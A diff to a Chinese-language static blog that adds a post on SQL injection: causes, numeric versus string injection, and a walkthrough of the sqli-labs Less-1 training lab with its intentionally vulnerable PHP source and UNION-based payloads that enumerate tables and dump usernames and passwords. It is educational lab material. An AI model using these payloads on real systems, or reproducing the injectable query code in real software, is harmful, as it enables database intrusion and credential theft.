@@ -297,6 +297,236 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/28/sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Reverse">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/12/28/sql%E6%B3%A8%E5%85%A5/" itemprop="url">sql注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-12-28T20:44:00+08:00">
+                2022-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="SQL注入漏洞形成的原因："><a href="#SQL注入漏洞形成的原因：" class="headerlink" title="SQL注入漏洞形成的原因："></a>SQL注入漏洞形成的原因：</h1><h2 id="动态字符串构建引起"><a href="#动态字符串构建引起" class="headerlink" title="动态字符串构建引起"></a>动态字符串构建引起</h2><ul>
+<li>不正确的处理转义字符（宽字节注入）</li>
+<li>不正确的处理错误（报错泄露信息）</li>
+<li>不正确的处理联合查询</li>
+<li>不正确的处理多次提交（二次注入）</li>
+</ul>
+<h2 id="后台存在的问题"><a href="#后台存在的问题" class="headerlink" title="后台存在的问题"></a>后台存在的问题</h2><ul>
+<li>后台无过滤或者编码用户数据</li>
+<li>数据库可以拼接用户传递的恶意代码</li>
+</ul>
+<h2 id="错误处理不当"><a href="#错误处理不当" class="headerlink" title="错误处理不当"></a>错误处理不当</h2><ul>
+<li>详细的内部错误消息显示给用户或攻击者</li>
+<li>错误信息可以直接给攻击者提供下一步攻击帮助</li>
+</ul>
+<h2 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h2><h1 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h1><h2 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h2><p>一种请求服务器的HTTP方法，使用该方法时，信息包含在URL中</p>
+<p><strong>格式：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=value1&amp;cat=value2&amp;num=value3..</span><br></pre></td></tr></table></figure>
+
+<h2 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h2><p>一种用于向Web服务器发送信息的HTTP方法，数据信息无法在URL中看到，可以发送字节大的数据</p>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p><strong>按数据类型</strong>：</p>
+<ul>
+<li>数字型</li>
+<li>字符型</li>
+</ul>
+<p><strong>按返回结果：</strong></p>
+<ul>
+<li>报错型</li>
+<li>盲注型</li>
+</ul>
+<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+
+<p><strong>提交</strong> <strong>1 and 1&#x3D;1</strong></p>
+<p>语句变成<strong>SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;1 limit 0,1</strong></p>
+<p>这时语句前值后值都为<strong>真</strong>，and以后也为<strong>真</strong>，返回查询到的数据。</p>
+<p>执行了攻击者额外的SQL查询语句，导致SQL注入漏洞猜列名。</p>
+<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+
+<p><strong>提交</strong> 1’ and ‘1’&#x3D;‘1</p>
+<p>语句变成<strong>SELECT * FROM users WHERE id&#x3D;‘1’ and ‘1’&#x3D;‘1’ limit 0,1</strong></p>
+<p>这时语句前值后值都为真，and以后也为真**，返回查询到的数据</p>
+<p>执行了攻击者额外的SQL查询语句，导致SQL注入漏洞猜列名</p>
+<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>?id&#x3D;1</p>
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229155538976.png" class title="This is an image">
+
+<p>?id&#x3D;2</p>
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229155733577.png" class title="This is an image">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;  报错</span><br><span class="line">?id=1&#x27; and 1=1 报错</span><br><span class="line">?id=1&#x27; and 1=1 --+ 正常</span><br></pre></td></tr></table></figure>
+
+<p>判断为字符型注入</p>
+<p><strong>联合注入：</strong></p>
+<p>1.首先要知道表格有几列，如果报错就是超过列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161209319.png" class title="This is an image">
+
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161327329.png" class title="This is an image">
+
+<p>说明表格有3列</p>
+<p>2.爆出显示位，就是看看表格中哪些列是显示在页面中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.获取当前的数据名和版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
+
+<p>可以知道，当前数据看是security，版本是5.7.26</p>
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161822154.png" class title="This is an image">
+
+<p>4.爆表名</p>
+<p>爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162006151.png" class title="This is an image">
+
+<p>5.爆字段名</p>
+<p>通过上面的查询我们知道当前数据库有四个表，根据表名我们猜测可能用户的账户和密码在users表中。所以我们要想办法得到该表下的字段名和内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162115279.png" class title="This is an image">
+
+<p>6.通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username , password) from users--+</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162232278.png" class title="This is an image">
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1069,7 +1299,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1080,7 +1310,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
